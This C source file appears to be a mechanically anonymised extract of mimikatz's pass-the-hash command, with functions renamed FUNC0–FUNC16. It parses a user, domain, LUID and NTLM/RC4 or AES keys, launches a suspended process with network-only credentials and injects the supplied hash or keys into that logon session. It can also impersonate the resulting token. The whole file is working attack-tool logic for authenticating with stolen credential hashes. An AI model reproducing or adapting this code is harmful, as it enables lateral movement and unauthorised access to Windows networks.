#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_11__   TYPE_4__ ;
typedef  struct TYPE_10__   TYPE_3__ ;
typedef  struct TYPE_9__   TYPE_2__ ;
typedef  struct TYPE_8__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int /*<<< orphan*/  tokenStats ;
struct TYPE_11__ {int /*<<< orphan*/  hProcess; int /*<<< orphan*/  hThread; int /*<<< orphan*/  dwThreadId; int /*<<< orphan*/  dwProcessId; } ;
struct TYPE_10__ {scalar_t__ isReplaceOk; int /*<<< orphan*/ * Aes256Key; int /*<<< orphan*/ * Aes128Key; int /*<<< orphan*/ * NtlmHash; int /*<<< orphan*/  member_4; int /*<<< orphan*/ * member_3; int /*<<< orphan*/ * member_2; int /*<<< orphan*/ * member_1; TYPE_1__* member_0; } ;
struct TYPE_8__ {int /*<<< orphan*/  LowPart; scalar_t__ HighPart; } ;
struct TYPE_9__ {TYPE_1__ AuthenticationId; } ;
typedef  TYPE_2__ TOKEN_STATISTICS ;
typedef  TYPE_3__ SEKURLSA_PTH_DATA ;
typedef  TYPE_4__ PROCESS_INFORMATION ;
typedef  int /*<<< orphan*/ * PCWCHAR ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  int /*<<< orphan*/  BYTE ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int AES_128_KEY_LENGTH ; 
 int AES_256_KEY_LENGTH ; 
 int /*<<< orphan*/  CREATE_SUSPENDED ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC1 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FALSE ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_2__*,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  KULL_M_PROCESS_CREATE_LOGON ; 
 scalar_t__ KULL_M_WIN_MIN_BUILD_7 ; 
 int LM_NTLM_HASH_LENGTH ; 
 int /*<<< orphan*/  LOGON_NETCREDENTIALS_ONLY ; 
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  STATUS_FATAL_APP_EXIT ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  SecurityDelegation ; 
 scalar_t__ FUNC8 (int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int TOKEN_DUPLICATE ; 
 int TOKEN_IMPERSONATE ; 
 int TOKEN_QUERY ; 
 int TOKEN_READ ; 
 int /*<<< orphan*/  TokenImpersonation ; 
 int /*<<< orphan*/  TokenStatistics ; 
 char* _wpgmptr ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int /*<<< orphan*/  FUNC10 (TYPE_3__*) ; 
 scalar_t__ FUNC11 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ *,char*,TYPE_4__*,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC12 (int,int /*<<< orphan*/ **,char*,int /*<<< orphan*/ **,char*) ; 
 scalar_t__ FUNC13 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC14 (int /*<<< orphan*/ *,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 

NTSTATUS FUNC16(int argc, wchar_t * argv[])
{
	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
	TOKEN_STATISTICS tokenStats;
	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256, szLuid = NULL;
	DWORD dwNeededSize;
	HANDLE hToken, hNewToken;
	PROCESS_INFORMATION processInfos;
	BOOL isImpersonate;

	if(FUNC12(argc, argv, L"luid", &szLuid, NULL))
	{
		tokenStats.AuthenticationId.HighPart = 0; // because I never saw it != 0
		tokenStats.AuthenticationId.LowPart = FUNC15(szLuid, NULL, 0);
	}
	else
	{
		if(FUNC12(argc, argv, L"user", &szUser, NULL))
		{
			if(FUNC12(argc, argv, L"domain", &szDomain, NULL))
			{
				isImpersonate = FUNC12(argc, argv, L"impersonate", NULL, NULL);
#pragma warning(push)
#pragma warning(disable:4996)
				FUNC12(argc, argv, L"run", &szRun, isImpersonate ? _wpgmptr : L"cmd.exe");
#pragma warning(pop)
				FUNC9(L"user\t: %s\ndomain\t: %s\nprogram\t: %s\nimpers.\t: %s\n", szUser, szDomain, szRun, isImpersonate ? L"yes" : L"no");

			}
			else FUNC6(L"Missing argument : domain\n");
		}
		else FUNC6(L"Missing argument : user\n");
	}

	if(FUNC12(argc, argv, L"aes128", &szAes128, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(FUNC13(szAes128, aes128key, AES_128_KEY_LENGTH))
			{
				data.Aes128Key = aes128key;
				FUNC9(L"AES128\t: "); FUNC14(data.Aes128Key, AES_128_KEY_LENGTH, 0); FUNC9(L"\n");
			}
			else FUNC6(L"AES128 key length must be 32 (16 bytes)\n");
		}
		else FUNC6(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(FUNC12(argc, argv, L"aes256", &szAes256, NULL))
	{
		if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
			if(FUNC13(szAes256, aes256key, AES_256_KEY_LENGTH))
			{
				data.Aes256Key = aes256key;
				FUNC9(L"AES256\t: "); FUNC14(data.Aes256Key, AES_256_KEY_LENGTH, 0); FUNC9(L"\n");
			}
			else FUNC6(L"AES256 key length must be 64 (32 bytes)\n");
		}
		else FUNC6(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
	}

	if(FUNC12(argc, argv, L"rc4", &szNTLM, NULL) || FUNC12(argc, argv, L"ntlm", &szNTLM, NULL))
	{
		if(FUNC13(szNTLM, ntlm, LM_NTLM_HASH_LENGTH))
		{
			data.NtlmHash = ntlm;
			FUNC9(L"NTLM\t: "); FUNC14(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); FUNC9(L"\n");
		}
		else FUNC6(L"ntlm hash/rc4 key length must be 32 (16 bytes)\n");
	}

	if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
	{
		if(szLuid)
		{
			FUNC9(L"mode\t: replacing NTLM/RC4 key in a session\n");
			FUNC10(&data);
		}
		else if(szUser)
		{
			if(FUNC11(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
			{
				FUNC9(L"  |  PID  %u\n  |  TID  %u\n",processInfos.dwProcessId, processInfos.dwThreadId);
				if(FUNC5(processInfos.hProcess, TOKEN_READ | (isImpersonate ? TOKEN_DUPLICATE : 0), &hToken))
				{
					if(FUNC2(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
					{
						FUNC10(&data);
						if(data.isReplaceOk)
						{
							if(isImpersonate)
							{
								if(FUNC1(hToken, TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityDelegation, TokenImpersonation, &hNewToken))
								{
									if(FUNC8(NULL, hNewToken))
										FUNC9(L"** Token Impersonation **\n");
									else FUNC7(L"SetThreadToken");
									FUNC0(hNewToken);
								}
								else FUNC7(L"DuplicateTokenEx");
								FUNC4(processInfos.hProcess, STATUS_SUCCESS);
							}
							else FUNC3(processInfos.hProcess);
						}
						else FUNC4(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
					}
					else FUNC7(L"GetTokenInformation");
					FUNC0(hToken);
				}
				else FUNC7(L"OpenProcessToken");
				FUNC0(processInfos.hThread);
				FUNC0(processInfos.hProcess);
			}
			else FUNC7(L"CreateProcessWithLogonW");
		}
		else FUNC6(L"Bas user or LUID\n");
	}
	else FUNC6(L"Missing at least one argument : ntlm/rc4 OR aes128 OR aes256\n");

	return STATUS_SUCCESS;
}